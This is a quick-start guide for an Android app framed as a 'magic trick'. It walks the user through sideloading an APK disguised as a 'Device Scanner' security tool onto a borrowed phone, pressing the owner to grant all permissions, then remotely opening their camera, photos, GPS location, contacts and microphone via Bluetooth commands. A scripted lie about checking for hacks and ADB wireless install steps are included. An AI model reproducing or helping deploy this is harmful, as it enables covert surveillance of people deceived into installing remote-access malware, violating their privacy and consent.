# 🚀 Quick Start Guide - Magic Trick Spectator App

## Step 1: Build the APK (5 minutes)

```bash
# Open Android Studio
cd /Users/tomernahumi/Documents/Plugins/MM\ report/nfc-magic-trick/android-spectator

# Open this folder in Android Studio
# Wait for Gradle sync
# Click: Build → Build Bundle(s) / APK(s) → Build APK(s)

# APK will be at:
# app/build/outputs/apk/debug/app-debug.apk
```

## Step 2: Transfer APK to Your Phone

```bash
# Option A: ADB
adb push app/build/outputs/apk/debug/app-debug.apk /sdcard/Download/

# Option B: Email yourself the APK
# Option C: Google Drive / Dropbox
```

## Step 3: Perform the Magic Trick

### **The Setup:**
1. Have the APK on YOUR phone
2. Approach spectator
3. Say: "Can I borrow your phone? I want to show you something"

### **The Install:**
1. They hand you their UNLOCKED phone
2. **Pair via Bluetooth** (Settings → Bluetooth → Pair)
3. **Send APK file** via Bluetooth from your phone
4. They receive: "Accept app-debug.apk?"
5. They tap **Accept**
6. File downloads
7. They tap the downloaded file
8. Prompt: "Install Device Scanner?"
9. They tap **Install** (3 seconds)
10. Done!

### **The Magic:**
1. App opens automatically
2. Shows: "Scanning Device..."
3. Requests permissions one by one
4. Say: "Just tap Allow for each - it needs to scan everything"
5. They grant permissions
6. App says: "Scan Complete ✓"

### **The Control:**
1. On YOUR phone, open Bluetooth terminal app
2. Connect to "Magic Scanner" service
3. Send commands:
   - Type: `camera` → Their camera opens!
   - Type: `gallery` → Their photos appear!
   - Type: `location` → Shows their GPS!
   - Type: `contacts` → Lists their contacts!
   - Type: `glitch` → Screen goes crazy!
   - Type: `reset` → Back to normal

### **The Reveal:**
- "See? I can access your camera..." (Show their face on screen)
- "Your location..." (Show GPS coordinates)
- "Your photos..." (Scroll through their gallery)
- "Even your contacts..." (Show contact list)
- Then: `reset` and uninstall

## Step 4: Bluetooth Terminal Apps

Download one of these on YOUR phone to send commands:

**Android:**
- "Bluetooth Terminal" by Qwerty
- "Serial Bluetooth Terminal" by Kai Morich
- "Bluetooth SPP Manager" by Giumig Apps

**How to use:**
1. Open app
2. Click "Connect"
3. Select "Magic Scanner" or the paired device
4. Type command (e.g., `camera`)
5. Press Send
6. Effect triggers on spectator's phone!

## 🎭 Performance Script:

**YOU:** "I've been working on a security app that can detect if your phone has been hacked. Want me to check yours?"

**THEM:** "Sure"

**YOU:** "Great! I'll need to install the scanner on your phone. It'll just take a second."

*(Install APK via Bluetooth)*

**THEM:** "What's this app?"

**YOU:** "It's called Device Scanner - it checks for security vulnerabilities. Just tap Install."

*(They install)*

**YOU:** "Now it needs some permissions to scan everything. Just tap Allow on each one."

*(They grant permissions)*

**YOU:** "Perfect! Now scanning..."

*(Send `camera` command from your phone)*

**THEM:** "Whoa! It opened my camera!"

**YOU:** "Yeah, that's part of the security check. Let me see what else it finds..."

*(Send `gallery` command)*

**THEM:** "That's my photos! How is it doing that?!"

**YOU:** "That's the scary part - if I can access this, so can a hacker. Look..."

*(Send `location` command)*

**THEM:** "It has my exact location?!"

**YOU:** "Yep. And your contacts, your microphone, everything..."

*(Send `reset` and uninstall)*

**YOU:** "Don't worry, I'll uninstall it now. But that's why phone security is so important!"

---

## 🎯 Commands Cheat Sheet:

```
camera      - Open front camera
gallery     - Show their photos
location    - Display GPS coordinates
contacts    - List contact names & numbers
microphone  - Record 5 seconds of audio
vibrate     - Vibrate phone
flashlight  - Flash LED 5 times
glitch      - Screen color chaos
crash       - Fake crash screen
battery     - Show battery level
bluetooth   - Show Bluetooth scan
reset       - Back to normal
```

## 💡 Tips:

1. **Practice the install first** on a test device
2. **Have your Bluetooth terminal app ready** before approaching
3. **Connect to their phone quickly** after install
4. **Send commands smoothly** - don't fumble
5. **Uninstall when done** - be ethical!

## ⚡ Ultra-Fast Method:

If you have ADB access:
```bash
# Enable wireless debugging on their phone
adb tcpip 5555

# Install from your phone wirelessly
adb connect [their-phone-ip]:5555
adb install app-debug.apk
```

---

**You now have a REAL magic trick that actually accesses their device! The reactions will be incredible! 🎩🔥**
